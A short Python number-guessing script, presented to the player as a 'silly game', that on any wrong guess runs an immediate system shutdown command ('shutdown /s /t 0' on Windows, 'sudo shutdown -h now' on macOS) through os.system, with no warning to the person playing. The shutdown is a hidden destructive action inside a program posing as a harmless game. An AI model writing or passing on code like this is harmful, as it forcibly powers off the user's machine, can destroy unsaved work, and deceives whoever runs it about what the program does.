import random
import os
import platform

# Generate a random number between 1 and 10
number = random.randint(1, 10)

# Prompt the user to guess
while True:
    guess = input("Silly game! Guess a number between 1 and 10: \nEnter:")

    # Validate input
    if not guess.isdigit():
        print("Please enter a valid number!")
        continue

    # Convert input to integer
    guess = int(guess)

    # Check the guess
    if guess == number:
        print("You Won!")
        break
    else:
        # Shutdown command for Windows
        if platform.system() == "Windows":
            os.system("shutdown /s /t 0")
        # Shutdown command for macOS (requires 'sudo' and admin password)
        elif platform.system() == "Darwin":
            os.system("sudo shutdown -h now")
        else:
            print("Incorrect guess! Try again.")

